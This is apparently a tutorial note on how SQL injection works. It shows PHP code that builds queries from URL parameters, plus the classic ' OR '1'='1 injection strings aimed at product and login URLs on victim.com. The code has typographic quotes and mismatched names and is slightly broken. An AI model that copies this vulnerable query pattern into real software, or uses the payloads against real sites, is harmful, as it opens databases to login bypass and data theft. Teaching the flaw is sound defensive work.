## How SQL works:

#### Suppose this is the target link:
```
http://www.victim.com/products.php?val=100
```

#### and this is the inside php code
```
// connect to the database
$conn = mysql_connect(“localhost”,“username”,“password”);
// dynamically build the sql statement with the input
$query = “SELECT ∗ FROM Products WHERE Price < ‘$_GET[“val”]’ ”.
 “ORDER BY ProductDescription”;
// execute the query against the database
$result = mysql_query($query);
// iterate through the record set
while($row = mysql_fetch_array($result, MYSQL_ASSOC))
{
// display the results to the browser
echo “Description : {$row[‘ProductDescription’]} <br>”.
 “Product ID : {$row[‘ProductID’]} <br>”.
 “Price : {$row[‘Price’]} <br><br>”;
}
```
#### Here's the breakdown:

1. **Connect to the Database**: Establish a connection to the database server (`localhost`) with a specified username and password.

2. **Build SQL Query**: Dynamically construct an SQL query using input from the URL parameter (`$_GET['val']`). The query selects all columns (`*`) from the `Products` table where the `Price` column is less than the value provided in the URL parameter.

3. **Execute Query**: Execute the constructed SQL query against the database using `mysql_query()`.

4. **Process Results**: Iterate through the result set returned by the query using `mysql_fetch_array()`. For each row in the result set, display the product description, product ID, and price to the browser.


## Understanding SQL Injection:

Let see how CMS maintain this:
```
http://www.victim.com/cms/login.php?username=foo&password=bar
```
#### inside php code:
```
// connect to the database
$conn = mysql_connect(“localhost”,“username”,“password”);
// dynamically build the sql statement with the input
$query = “SELECT userid FROM CMSUsers WHERE user = ‘$_GET[“user”]’ ”.
 “AND password = ‘$_GET[“password”]’”;
// execute the query against the database
$result = mysql_query($query);
// check to see how many rows were returned from the database
$rowcount = mysql_num_rows($result);
// if a row is returned then the credentials must be valid, so
// forward the user to the admin pages
if ($rowcount ! = 0){header(“Location: admin.php”);}
// if a row is not returned then the credentials must be invalid
else {die(‘Incorrect username or password, please try again.’)}
```
### Let's break down each component:

**URL Parameters:** The username and password provided in the URL (foo and bar, respectively) are passed as parameters to the PHP script (login.php) via the $_GET superglobal array.

**PHP Code Logic:**

- The PHP script establishes a connection to the database.
- It constructs an SQL query dynamically using the provided username and password parameters.
- The query is executed against the database to validate the user credentials.
- If the provided credentials are valid (i.e., if the query returns at least one row), the user is redirected to the admin page (admin.php).
- If the credentials are invalid (i.e., if the query returns no rows), an error message is displayed, and the script terminates.

#### Now let's put this modified query:
```
http://www.victim.com/cms/login.php?username=foo&password=bar’ OR ‘1’=’1
```
#### It will work like this:
```
SELECT userid
FROM CMSUsers
WHERE user = ‘foo’ AND password = ‘password’ OR ‘1’ = ‘1’;
```
#### or you can modify the previous example:
```
http://www.victim.com/products.php?val=100’ OR ‘1’=‘1
```
#### It will work like this:
```
SELECT ∗
FROM ProductsTbl
WHERE Price < ‘100.00’ OR ‘1’ = ‘1’
ORDER BY ProductDescription;
```
